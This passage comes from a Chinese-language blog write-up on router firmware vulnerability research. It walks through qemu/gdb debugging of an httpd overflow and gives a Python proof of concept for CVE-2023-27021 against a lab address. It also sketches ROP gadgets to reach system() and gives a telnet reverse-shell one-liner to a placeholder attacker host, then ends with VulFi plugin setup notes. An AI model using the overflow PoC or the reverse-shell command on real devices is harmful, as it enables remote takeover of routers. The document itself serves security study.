+</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">4096</span>)
+</span></span><span style="display:flex;"><span>response <span style="color:#ff79c6">=</span> response<span style="color:#ff79c6">.</span>decode()
+</span></span><span style="display:flex;"><span>li(response)
+</span></span></code></pre></div><p>动态调试</p>
+<p>qemu开启gdbserver</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo qemu-arm-static -g <span style="color:#bd93f9">1234</span> -L ./ ./bin/httpd
+</span></span></code></pre></div><p>gdb attach</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb-mulitarch
+</span></span><span style="display:flex;"><span>$ file bin/httpd
+</span></span><span style="display:flex;"><span>$ b *0x00079F64
+</span></span></code></pre></div><p>发送PoC，调试到漏洞出现的地方</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ► 0x7a064 &lt;fromAddressNat+256&gt;    bl     <span style="color:#6272a4">#sprintf@plt                       &lt;sprintf@plt&gt;</span>
+</span></span><span style="display:flex;"><span>        s: 0x4080010c ◂— 0x0
+</span></span><span style="display:flex;"><span>        format: 0xe6054 ◂— <span style="color:#f1fa8c">&#39;advance/addressNatList.asp?page=%s&#39;</span>
+</span></span><span style="display:flex;"><span>        vararg: 0x125250 ◂— 0x61616161 <span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;aaaa&#39;</span><span style="color:#ff79c6">)</span>
+</span></span></code></pre></div><p>在函数返回时，将pc赋值</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ► 0x7a0c8 &lt;fromAddressNat+356&gt;    sub    sp, fp, <span style="color:#6272a4">#8</span>
+</span></span><span style="display:flex;"><span>   0x7a0cc &lt;fromAddressNat+360&gt;    pop    <span style="color:#ff79c6">{</span>r4, fp, pc<span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// ...
+</span></span><span style="display:flex;"><span>Invalid address 0x61616160
+</span></span></code></pre></div><h3 id="cve-2023-27021">CVE-2023-27021</h3>
+<p>参考：<a href="https://xz.aliyun.com/t/13506?time__1311=mqmxnQiQi%3DDQ0%3DGODlcIEHfh%2BfhfrD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-5">路由器通用0day漏洞挖掘及RCE思路</a></p>
+<p>相同的固件，函数是 <code>formSetFirewallCfg</code></p>
+<p>PoC</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://192.168.85.131/goform/SetFirewallCfg&#34;</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#ff79c6">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Content-Type&#34;</span>: <span style="color:#f1fa8c">&#34;application/x-www-form-urlencoded; charset=UTF-8&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Cookie&#34;</span>: <span style="color:#f1fa8c">&#34;password=hamster&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">500</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;firewallEn&#34;</span>: payload}
+</span></span><span style="display:flex;"><span>resp <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, headers<span style="color:#ff79c6">=</span>header, data<span style="color:#ff79c6">=</span>data, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5</span>)
+</span></span><span style="display:flex;"><span>resp <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(url, headers<span style="color:#ff79c6">=</span>header, data<span style="color:#ff79c6">=</span>data, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">5</span>)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(resp<span style="color:#ff79c6">.</span>text)
+</span></span></code></pre></div><p>这两个漏洞都是可以控制函数执行流的，因此需要学习一下ROP是如何写</p>
+<ul>
+<li>libcbase: 在gdb里面vmmap一下</li>
+<li>ROP: 需要知道各个寄存器的作用</li>
+<li>路由器一般不支持bin/bash命令，选择用telnet来getshell</li>
+</ul>
+<p>可以使用pop pc 来控制函数执行流</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#50fa7b">pop</span> {r3, pc}
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">r3_val:</span> <span style="color:#50fa7b">system_addr</span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">pc:</span> 将地址改成下面指令地址
+</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">mov</span> r0, sp <span style="color:#6272a4">// r0作为第一个参数
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	<span style="color:#50fa7b">blx</span>, r3
+</span></span></code></pre></div><p>telnet 反弹shell</p>
+<ul>
+<li>telnet在攻击者主机x.x.x.x及port1开启监听用户，并将此处Telnet的标准输入通过管道符传给后面命令<code>/bin/bash</code>执行，再将<code>/bin/bash</code>的输出结果作为后面<code>telnet</code>的输入。此时通过两个端口，一个接收用户输入，通过<code>/bin/bash</code>处理后再由另一个端口输出。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># (x.x.x.x为攻击机ip)</span>
+</span></span><span style="display:flex;"><span>$ telnet x.x.x.x <span style="color:#bd93f9">6666</span> | /bin/bash | telnet x.x.x.x <span style="color:#bd93f9">5555</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 我们监听5555端口</span>
+</span></span></code></pre></div><h2 id="more">more</h2>
+<p>IDA漏洞扫描插件：<a href="https://github.com/Accenture/VulFi">VulFi: IDA Pro plugin for query based searching within the binary useful mainly for vulnerability research</a></p>
+<p>工具安装：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/Accenture/VulFi
+</span></span></code></pre></div><p>然后将某些文件其放在ida/plugins目录下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cp vulfi.py vulfi_prototypes.json vulfi_rules.json ~/~/idafree-8.4/plugins
+</span></span></code></pre></div><p>在search栏就能找到 <code>VulFi</code> 图标</p>
+<p>写自己的规则：将alt_names 改成自己的列表就行，可以参考默认的。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;name&#34;</span>: <span style="color:#f1fa8c">&#34;RULE NAME&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;alt_names&#34;</span>:[
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;function_name_to_look_for&#34;</span>
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;wrappers&#34;</span>:<span style="color:#ff79c6">true</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&#34;mark_if&#34;</span>:{
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;High&#34;</span>:<span style="color:#f1fa8c">&#34;True&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;Medium&#34;</span>:<span style="color:#f1fa8c">&#34;False&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">&#34;Low&#34;</span>: <span style="color:#f1fa8c">&#34;False&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/iot">IoT</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
